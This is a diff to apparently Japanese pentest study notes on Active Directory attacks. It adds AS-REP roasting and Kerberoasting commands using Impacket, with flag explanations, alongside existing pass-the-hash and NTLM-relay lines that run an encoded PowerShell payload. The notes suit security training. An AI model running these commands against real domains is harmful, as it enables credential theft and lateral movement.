@@ -18,3 +18,17 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955ab
 ```
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.201.212 -c "powershell -enc JABjAGwAaQBlAG..."
 ```
+
+4. AS-REP Roastingの攻撃をADに対して実行する。ここで出力されたユーザ名はKerberos preauthenticationが無効になっていることを示し、AS-REQ Roasting攻撃に脆弱な可能性があることを示す。  
+-dc-ip => DCのIPアドレスを指定  
+-outputfile => AS-REPハッシュがhashcatの形式で保存される出力ファイルの名前を入力する。  
+-request => TGTを要求する  
+domain/user => 認証のターゲットにするユーザとドメイン名
+```
+impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
+```
+
+5. Kerberoastingを実行するために、TGSを取得してhashcatで解析できる形でサービスチケットのハッシュを出力する。
+```
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+```
